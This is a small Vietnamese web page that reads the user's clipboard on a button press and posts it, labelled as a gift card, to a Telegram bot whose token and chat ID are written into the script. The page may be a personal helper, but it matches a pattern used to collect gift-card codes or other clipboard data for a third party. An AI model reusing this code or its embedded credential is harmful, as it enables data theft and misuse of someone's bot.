<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Clipboard Tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }

    h2 {
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 16px;
      margin-top: 12px;
      font-size: 18px;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* THÔNG BÁO */
    #giftStatus {
      margin-bottom: 8px;
      font-size: 15px;
      font-weight: bold;
      display: none;
    }

    #giftStatus.error {
      color: #d32f2f;
    }

    #giftStatus.success {
      color: #2e7d32;
    }
  </style>
</head>
<body>

<h2>📋 Clipboard Tool</h2>

<!-- THÔNG BÁO NẰM TRÊN NÚT -->
<div id="giftStatus"></div>

<button id="giftBtn" onclick="sendGiftcard()">📤 Gửi giftcard</button>

<script>
const BOT_TOKEN = "8532371199:AAGPwvx5Jt1Ul6Js0DuzRJk-RVhuWROH0R0";
const CHAT_ID = "5376711844";

function disableButtons(state) {
  document.getElementById("giftBtn").disabled = state;
}

function showGiftStatus(text, type) {
  const el = document.getElementById("giftStatus");
  el.textContent = text;
  el.className = type;
  el.style.display = "block";
}

/* ===== GỬI GIFTCARD ===== */
async function sendGiftcard() {
  disableButtons(true);

  let text = "";
  try {
    text = await navigator.clipboard.readText();
  } catch (e) {
    showGiftStatus("❌ Không đọc được clipboard", "error");
    disableButtons(false);
    return;
  }

  if (!text) {
    showGiftStatus("❌ Clipboard trống", "error");
    disableButtons(false);
    return;
  }

  text = text.trim();

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  })
  .then(() => {
    showGiftStatus("✅ Gửi gift card thành công", "success");
    // giữ disable vĩnh viễn khi success
  })
  .catch(() => {
    showGiftStatus("❌ Gửi thất bại", "error");
    disableButtons(false);
  });
}
</script>

</body>
</html>
